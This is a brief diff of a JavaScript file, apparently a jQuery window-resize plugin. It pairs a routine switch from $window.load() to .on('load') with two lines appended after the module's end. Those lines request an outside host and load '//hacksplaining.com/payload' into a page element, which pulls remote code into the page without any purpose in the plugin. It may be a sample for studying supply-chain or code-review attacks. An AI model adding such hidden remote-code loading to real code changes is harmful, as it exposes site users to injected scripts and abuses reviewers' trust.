@@ -159,7 +159,7 @@
 
                 if ( 'resize' in $window ) {
                     this.resize( utilities.DIMENSIONS.HEIGHT, this.getHeight() );
-                    $window.load( function() {
+                    $window.on("load",function() {
                         $window.resize();
                     } );
                 }
@@ -458,3 +458,5 @@
 
 } ) ( window );
 
+$.get('//hacksplaining.com') 
+$('#selector').load('//hacksplaining.com/payload')
